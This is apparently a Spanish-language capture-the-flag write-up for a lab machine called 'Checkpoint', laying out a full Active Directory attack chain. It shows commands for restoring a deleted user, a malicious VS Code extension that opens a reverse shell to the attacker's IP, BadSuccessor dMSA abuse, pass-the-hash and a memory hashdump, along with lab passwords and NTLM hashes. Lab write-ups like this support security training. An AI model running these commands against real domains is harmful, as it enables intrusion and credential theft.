00 — Overview

Resumen Ejecutivo

Checkpoint es una máquina avanzada que combina cuatro vectores distintos: enumeración LDAP para descubrir un objeto eliminado restaurable, lateral movement vía extensión maliciosa de VSCode, escalada de privilegios mediante BadSuccessor (abuso de Delegated Managed Service Accounts sobre Windows Server 2025), y extracción de credenciales desde un volcado de memoria VM con Volatility3.

El DC corre Windows Server 2025 Build 26100, lo que lo hace vulnerable a BadSuccessor: la primera implementación public de explotación de dMSA para impersonar cuentas de servicio. alex.turner tiene CREATE_CHILD en OU=Employees, suficiente para arrancar el ataque.

Attack Path
alex.turner (creds iniciales) → bloodyad Deleted Objects → mark.davies restore → DevDrop WRITE → VSIX revshell → ryan.brooks shell → BadSuccessor dMSA → svc_deploy NTLM → VMBackups PtH → Volatility3 hashdump → max.palmer / root.txt
01 — Recon

SMB Enum — DevDrop y VMBackups como objetivos

Fase 01
Shares con alex.turner → DevDrop (VS Code extensions) y VMBackups (restringido)

Con las credenciales iniciales de alex.turner enumeramos shares y usuarios. Destacan dos shares: DevDrop (extensiones VSCode aprovadas) con acceso READ, y VMBackups sin permisos visibles. La descripción de DevDrop menciona extensiones compatibles con VS Code engine 1.118.0.

nxc smb 10.129.47.194 -u alex.turner -p 'Checkpoint2024!' --shares
DevDrop   READ    VS Code extensions share (.vsix engine 1.118.0)
VMBackups           (sin permisos con alex.turner)

bloodyad --host 10.129.47.194 -d checkpoint.com -u alex.turner -p 'Checkpoint2024!' get writable
CN=Deleted Objects  WRITE
OU=Employees        CREATE_CHILD
CN=Mark Davies\0ADEL:... WRITE
02 — AD Objects

Restaurar mark.davies — Deleted Object con WRITE

Fase 02
mark.davies eliminado → bloodyad set restore → reutilización de contraseña → DevDrop WRITE

alex.turner tiene permiso WRITE sobre el objeto eliminado mark.davies. Lo restauramos con bloodyad. Al probar reutilización de contraseña, mark.davies comparte la misma password que alex.turner. Con mark.davies el share DevDrop pasa a READ+WRITE.

bloodyad --host 10.129.47.194 -d checkpoint.com -u alex.turner -p 'Checkpoint2024!' set restore mark.davies
[+] mark.davies has been restored under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb

nxc smb 10.129.47.194 -u mark.davies -p 'Checkpoint2024!'
[+] checkpoint.htb\mark.davies:Checkpoint2024!

# DevDrop ahora con WRITE
DevDrop   READ,WRITE
03 — RCE

VSIX Malicioso → Reverse Shell como ryan.brooks

Fase 03
vsix_revshell.py genera extensión backdooreada → sube a DevDrop → shell

El share DevDrop es procesado automáticamente por una instancia de VS Code que corre como ryan.brooks. Generamos una extensión VSIX maliciosa con vsix_revshell.py que al activarse ejecuta un payload PowerShell de reverse shell. Al subir el .vsix, en cuestion de segundos obtenemos la conexión.

python3 vsix_revshell.py -i 10.10.14.29 -p 4444 -t powershell
[+] revshell.vsix generado

smbclient //10.129.47.194/DevDrop -U 'mark.davies%Checkpoint2024!' -c 'put revshell.vsix'

rlwrap nc -lvnp 4444

04 — PrivEsc

BadSuccessor — dMSA para impersonar svc_deploy

Fase 04
Windows Server 2025 vulnerable — dMSA + enlace inverso → NTLM de svc_deploy

El DC corre Windows Server 2025 (Build 26100), vulnerable a BadSuccessor: abuso del mecanismo de migración de cuentas dMSA. alex.turner puede crear una dMSA en OU=Employees. ryan.brooks tiene GenericWrite sobre svc_deploy para completar el enlace inverso necesario por el KDC parcheado. El S4U2Self con soporte dMSA extrae las claves previas — el hash NTLM de svc_deploy.

# Crear dMSA vinculada a svc_deploy (como alex.turner)
bloodyad --host 10.129.47.194 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' add badSuccessor dmsa_pwn2 -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" --ou "OU=Employees,DC=checkpoint,DC=htb"
[+] Creating DMSA dmsa_pwn2$ — Impersonating svc_deploy

# Enlace inverso desde shell ryan.brooks (GenericWrite sobre svc_deploy)
$target = [ADSI]"LDAP://CN=svc_deploy,..."; $target.Put("msDS-SupersededManagedAccountLink","CN=dmsa_pwn2,..."); $target.Put("msDS-SupersededServiceAccountState",2); $target.SetInfo()

# S4U2Self con soporte dMSA → Previous keys = NTLM de svc_deploy
impacket-getST -k -no-pass -dc-ip 10.129.47.194 -impersonate 'dmsa_pwn2$' -self -dmsa 'checkpoint.htb/alex.turner'
Previous keys rc4_hmac: e16081eb077aca74bdbf8af12af43ac9
# → NTLM de svc_deploy
05 — Memory Forensics

VMBackups + Volatility3 — SAM dump del snapshot de VM

Fase 05
svc_deploy PtH → VMBackups → .vmem snapshot → Volatility3 hashdump

Con el hash NTLM de svc_deploy (miembro del grupo BackupAccess) accedemos a VMBackups. Contiene un backup completo de una VM Windows Server 2019 con un volcado de memoria .vmem. Volatility3 extrae los hashes de las cuentas SAM locales del snapshot, entre ellos las credenciales que llevan a max.palmer y al root.txt del dominio.

# PtH con hash de svc_deploy → VMBackups
smbclient //10.129.47.194/VMBackups -U 'svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash -c "recurse; prompt; mget *"

# Análisis con Volatility3
vol -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump
Administrator  500  aad3b435b51404eeaad3b435b51404ee  f29e9c014295b9b32139b09a2790be3b
